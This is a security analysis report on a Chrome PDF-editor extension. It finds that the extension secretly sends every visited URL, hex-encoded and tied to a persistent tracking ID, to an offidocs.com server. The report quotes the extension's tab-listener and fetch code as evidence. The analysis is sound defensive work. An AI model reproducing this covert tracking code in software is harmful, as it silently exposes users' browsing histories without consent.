# Vulnerability Report: PDF editor online

## Metadata
- **Extension ID**: njbdnibcpdbppaidpkopicbkgnbnkkhi
- **Extension Name**: PDF editor online
- **Version**: 2.14.2
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

PDF editor online is a Chrome extension that presents itself as a tool to "Create and edit PDF files with PDF editor online". However, the extension implements undisclosed browsing activity tracking that sends full URLs of all visited pages to offidocs.com servers. The extension monitors all tab changes and URL updates, hex-encodes the visited URLs, and transmits them to a remote server along with a persistent user identifier. This data collection is not disclosed in the extension's description and constitutes a significant privacy violation.

The extension generates a persistent username identifier stored in chrome.storage.local and exfiltrates every URL the user visits (excluding offidocs.com URLs) to `https://www.offidocs.com/media/system/app/checkdownloadpdfeditory_2_nav.php`. This tracking occurs silently in the background without user notification or consent.

## Vulnerability Details

### 1. HIGH: Undisclosed Browsing Activity Tracking and Exfiltration

**Severity**: HIGH
**Files**: websecure.js, service_worker.js
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The extension implements comprehensive browsing activity tracking that monitors all tab activations and URL changes. Every time a user visits a new page or switches tabs, the extension captures the full URL and sends it to offidocs.com servers.

**Evidence**:

In `websecure.js`, the extension sets up listeners for all tab events:

```javascript
chrome.tabs.onActivated.addListener(function(activeInfo) {
    activeTabId = activeInfo.tabId;
    getTabInfo(activeTabId);
});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    getTabInfo(tabId);
});
```

The `getTabInfo` function captures URLs and calls the exfiltration function:

```javascript
function getTabInfo(tabId) {
    chrome.tabs.get(tabId, function(tab) {
        if ( ( tab.url.indexOf("offidocs") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lastUrl != tab.url) )  {
            urlx = tab.url;
            extractpdf(urlx, tabId);
            lastUrl = tab.url;
        }
    });
}
```

The `extractpdf` function sends data to the remote server:

```javascript
async function extractpdf(urlxx, tid) {
    // ... generates/retrieves persistent username ...

    let responsecheck = await fetch('https://www.offidocs.com/media/system/app/checkdownloadpdfeditory_2_nav.php?filepath=' + bin2hex(urlxx) + '&hex=' + tid + '&u=' + un);
```

The URL is hex-encoded using `bin2hex()` and transmitted along with:
- `filepath` parameter: hex-encoded full URL of visited page
- `hex` parameter: tab ID
- `u` parameter: persistent username identifier

The extension generates a persistent 10-character alphanumeric identifier stored in `chrome.storage.local` that serves as a tracking ID across all browsing sessions.

**Verdict**:
This is a clear privacy violation. The extension collects comprehensive browsing history data without disclosure. While the extension claims to be a PDF editor, there is no legitimate reason for it to monitor and exfiltrate ALL URLs visited by the user. The data is sent to a third-party server with a persistent identifier, enabling long-term user tracking and profiling. The only exclusion is for offidocs.com URLs themselves, indicating the tracking is intentional and not a byproduct of legitimate functionality.

### 2. MEDIUM: Persistent User Tracking Identifier

**Severity**: MEDIUM
**Files**: websecure.js, popup.js
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The extension generates and stores a persistent random username that serves as a permanent tracking identifier across browsing sessions.

**Evidence**:

```javascript
username = "" + randomString(10) + "".toLowerCase();
datax.username = username;
await chrome.storage.local.set(data);
```

This identifier is:
- Generated on first install
- Stored permanently in chrome.storage.local
- Sent with every URL exfiltration request
- Enables cross-session user tracking and profiling

**Verdict**:
The persistent identifier enables long-term tracking of user behavior across sessions. Combined with the URL exfiltration, this allows the remote server to build comprehensive browsing profiles tied to specific users.

## False Positives Analysis

The extension legitimately provides PDF editing functionality through an embedded iframe to offidocs.com. The popup.js shows standard interaction with the offidocs.com service for PDF file management. However, the background tracking in websecure.js goes far beyond what would be necessary for PDF editing functionality.

A legitimate PDF detection feature would only need to:
- Detect PDF files when explicitly requested by the user
- Possibly scan the current page for PDF links when the popup is opened

Instead, this extension monitors ALL browsing activity continuously in the background, even when the user is not using the extension or visiting any PDF-related content.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| www.offidocs.com/media/system/app/checkdownloadpdfeditory_2_nav.php | URL exfiltration | Hex-encoded visited URL, tab ID, persistent user identifier | HIGH - Privacy violation |
| www.offidocs.com/media/system/app/checkdownloadpdfeditorr_2_nav.php | Retrieve PDF file list | User identifier | MEDIUM - Legitimate functionality but uses tracking ID |
| www.offidocs.com/public/ | PDF editor interface | None (iframe embed) | LOW - Legitimate functionality |
| www.offidocs.com/community/preprefile.php | File preparation | User identifier | MEDIUM - Legitimate functionality but uses tracking ID |

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**:
This extension engages in undisclosed comprehensive browsing activity tracking that represents a serious privacy violation. While the extension does provide legitimate PDF editing functionality, the background monitoring and exfiltration of all visited URLs goes far beyond what is necessary for its stated purpose. The extension:

1. Monitors ALL tab activations and URL changes across the entire browser
2. Exfiltrates full URLs to a remote server with a persistent tracking identifier
3. Does not disclose this data collection in its description or request appropriate permissions
4. Implements persistent cross-session user tracking
5. Only has "storage" and "tabs" permissions, which are insufficient indication of the actual data collection scope

This constitutes a clear case of privacy-violating surveillance that users would not reasonably expect from a PDF editing tool. The data collected could reveal highly sensitive information about user browsing habits, interests, and potentially sensitive websites visited (financial, medical, etc.).

The extension does not request host permissions for all URLs, yet still accesses tab URL data through the tabs API, which is technically permitted but ethically questionable given the lack of disclosure.

**Recommendation**: HIGH risk classification is appropriate. Users should be warned that this extension tracks all browsing activity and sends it to external servers.
